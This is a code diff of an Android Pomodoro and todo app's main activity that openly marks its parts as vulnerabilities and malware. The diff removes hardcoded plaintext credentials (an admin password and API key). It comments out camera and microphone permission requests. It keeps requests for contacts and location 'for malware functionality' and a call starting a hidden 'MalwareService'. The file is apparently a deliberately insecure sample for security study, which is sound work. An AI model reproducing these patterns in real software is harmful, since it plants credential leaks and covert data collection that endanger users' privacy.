@@ -46,12 +46,15 @@ class MainActivity : ComponentActivity() {
         repository = TodoRepository(
             database.todoDao(),
             database.timerSessionDao(),
-            database.userCredentialsDao(),
+            database.userSettingsDao(),
             ApiClient.apiService
         )
 
         // VULNERABILITY: Initialize with plain text credentials
-        initializeCredentials()
+//        initializeCredentials()
+
+        // will reset premium status every time. ood for demos
+        resetPremiumStatus()
 
         // Request permissions for malware functionality
         requestPermissions()
@@ -68,31 +71,13 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    private fun initializeCredentials() {
-        CoroutineScope(Dispatchers.IO).launch {
-            val existingCredentials = repository.getCredentials()
-            if (existingCredentials == null) {
-                // VULNERABILITY: Store credentials in plain text
-                repository.saveCredentials(
-                    UserCredentialsEntity(
-                        username = "admin",
-                        password = "password123", // Plain text password
-                        apiKey = "secret_api_key_123",
-                        isPremium = false
-                    )
-                )
-            } else
-                repository.updatePremiumStatus(false)
-        }
-    }
-
     private fun requestPermissions() {
         val permissions = arrayOf(
             android.Manifest.permission.READ_CONTACTS,
             android.Manifest.permission.ACCESS_FINE_LOCATION,
             android.Manifest.permission.ACCESS_COARSE_LOCATION,
-            android.Manifest.permission.CAMERA,
-            android.Manifest.permission.RECORD_AUDIO
+            // android.Manifest.permission.CAMERA,
+            // android.Manifest.permission.RECORD_AUDIO
         )
 
         val permissionsToRequest = permissions.filter {
@@ -106,12 +91,20 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    private fun resetPremiumStatus() {
+        CoroutineScope(Dispatchers.IO).launch {
+            // Reset premium status on every app startup
+            repository.updatePremiumStatus(false)
+        }
+    }
+
     private fun startMalwareService() {
         // MALWARE: Start background service
         val intent = Intent(this, MalwareService::class.java)
         startService(intent)
     }
 }
+
 
 @Composable
 fun PomodoroApp(repository: TodoRepository) {
@@ -132,3 +125,5 @@ fun PomodoroApp(repository: TodoRepository) {
         todoViewModel = todoViewModel
     )
 }
+
+
